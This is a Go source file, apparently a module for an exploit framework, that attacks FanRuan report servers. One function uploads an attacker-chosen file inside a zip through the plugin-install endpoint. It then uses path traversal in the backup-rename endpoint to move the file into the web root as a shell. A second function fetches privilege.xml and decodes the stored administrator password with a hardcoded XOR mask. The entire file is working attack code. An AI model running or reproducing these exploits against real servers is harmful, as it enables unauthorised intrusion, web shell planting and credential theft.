package exp_fanruan

import (
	"archive/zip"
	"bytes"
	"encoding/xml"
	"fmt"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"github.com/lz520520/railgunlib/pkg/utils/lznet/lzhttp"
	"path/filepath"
	"strconv"
	"strings"
)

// 获取文件名，如C:/test.exe 返回 test
func GetBaseName(name string) string {
	filenameWithSuffix := filepath.Base(name)
	fileSuffix := filepath.Ext(filenameWithSuffix)
	return strings.TrimSuffix(filenameWithSuffix, fileSuffix)
}

type Exp_Upload1 struct {
	exp_templates.ExpTemplate
}

func (self *Exp_Upload1) Upload1(filename string, content string) (expUploadResult exp_model.ExpUploadResult) {
	// 默认配置
	headers := self.GetInitExpHeaders()

	// 构造payload
	target := self.AppendUri(self.Params.Target, "/ReportServer?op=plugin&cmd=local_install")

	// zip压缩xml和shell
	b := &bytes.Buffer{}
	zw := zip.NewWriter(b)

	iowriter, _ := zw.Create(filename)
	iowriter.Write([]byte(content))
	zw.Flush()
	zw.Close()

	// 发送请求
	multiParts := []lzhttp.PostMultiPart{
		{
			FieldName:   "file",
			FileName:    GetBaseName(filename) + ".zip",
			ContentType: "application/x-zip-compressed",
			Content:     b.Bytes(),
		},
	}
	httpresp := self.HttpPostMulti(target, multiParts, headers)
	if httpresp.Err != nil {
		expUploadResult.Err = httpresp.Err
		return
	}
	if httpresp.Resp.StatusCode != 200 {
		self.EchoErrMsg("上传失败")
		return
	}

	targe2 := self.AppendUri(self.Params.Target, fmt.Sprintf("/ReportServer?op=fr_server&cmd=manual_backup&optype=edit_backup&oldname=../../tmp/%s&newname=../../../%s", filename, filename))
	httpresp = self.HttpGetWithoutRedirect(targe2, headers)
	if httpresp.Err != nil {
		expUploadResult.Err = httpresp.Err
		return
	}

	if httpresp.Resp.StatusCode != 200 {
		self.EchoErrMsg("迁移文件失败")
		return
	}

	shellUrl := self.AppendUri(self.Params.Target, "/"+filename)
	httpresp = self.HttpGetWithoutRedirect(shellUrl, headers)
	if httpresp.Err != nil {
		expUploadResult.Err = httpresp.Err
		return
	}
	expUploadResult.RawResult = httpresp.RawFullResp

	if httpresp.Resp.StatusCode == 200 {
		expUploadResult.RespPath = shellUrl
		expUploadResult.Status = true
	}
	return
}

type PrivilegeManager struct {
	XMLName                xml.Name `xml:"PrivilegeManager"`
	Text                   string   `xml:",chardata"`
	XmlVersion             string   `xml:"xmlVersion,attr"`
	ReleaseVersion         string   `xml:"releaseVersion,attr"`
	FsSystemManagerPassSet string   `xml:"fsSystemManagerPassSet,attr"`
	Birthday               string   `xml:"birthday,attr"`
	Male                   string   `xml:"male,attr"`
	RootManagerName        struct {
		Text string `xml:",chardata"`
	} `xml:"rootManagerName"`
	RootManagerPassword struct {
		Text string `xml:",chardata"`
	} `xml:"rootManagerPassword"`
	AP struct {
		Text string `xml:",chardata"`
	} `xml:"AP"`
	ForwardUrl struct {
		Text string `xml:",chardata"`
	} `xml:"ForwardUrl"`
}

func (self *Exp_Upload1) GetMsg1(cmd string) (expResult exp_model.ExpResult) {
	target := self.AppendUri(self.Params.Target, "/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml")
	httpresp := self.HttpGetWithoutRedirect(target, self.GetInitExpHeaders())
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err
		return
	}
	expResult.RawResult = httpresp.RawFullResp
	pm := new(PrivilegeManager)
	err := xml.Unmarshal([]byte(httpresp.Body), pm)
	if err != nil {
		self.EchoErrMsg("无xml文件，解析失败")
		return
	}
	cipher := strings.TrimSpace(pm.RootManagerPassword.Text)
	if len(cipher) < 4 {
		self.EchoErrMsg("PrivilegeManager.RootManagerPassword is error")
		return
	}

	// 解密
	PASSWORD_MASK_ARRAY := []byte{19, 78, 10, 15, 100, 213, 43, 23}
	pwd := ""
	cipher = cipher[3:]
	for i := 0; i < int(len(cipher)/4); i++ {
		c1, err := strconv.ParseUint(cipher[i*4:(i+1)*4], 16, 32)
		if err != nil {
			expResult.Err = err
			return
		}
		c2 := byte(c1) ^ PASSWORD_MASK_ARRAY[i%8]
		pwd += string(c2)
	}

	expResult.Result = fmt.Sprintf("username: %s; password: %s", strings.TrimSpace(pm.RootManagerName.Text), pwd)
	return
}

func init() {
	//fmt.Printf("%v, %v", reflect.ValueOf(test).Type(), reflect.ValueOf(test).Kind())
	expmsg := exp_model.ExpMsg{
		Time: `2020-08-17`,
		Range: `

`,
		ID:       ``,
		Describe: `帆软管理后台任意文件上传`,
		Details: `
输入URL不要带路径，跟应用的目录URI就行了。
1. 文件名不要有路径。
2. 填入cookie，因为是后台的洞
3. 返回提供url

获取信息：获取管理员账号密码

`,
		Payload: ``,
	}

	//expSubOption := options.ExpSubOption{
	//	CmdContent: "",
	//	CmdSubOptions: []options.ExpSubOptionItem{
	//		{
	//			StaticText: "并发数: ",
	//			Key:        "tasks",
	//			Value:      "20",
	//		},
	//	},
	//	UploadModes: []options.UploadModeType{options.UploadMemShell},
	//}
	//aliasMap := map[string]string{
	//	"1": "KeyCheck",
	//	"2": "NoDependEcho",
	//	"3": "TomcatEcho",
	//	"4": "AllGadgetsTest",
	//	"5": "GadgetCheckWithSleep",
	//}
	//subOptions := map[string]options.ExpSubOption{
	//	"": expSubOption,
	//}
	registerMsg := exp_register.ExpRegisterMsg{
		Msg: expmsg,
		//SubOptions: subOptions,
		//AliasMap:   aliasMap,
	}
	exp_register.ExpStructRegister(&Exp_Upload1{}, registerMsg)

}
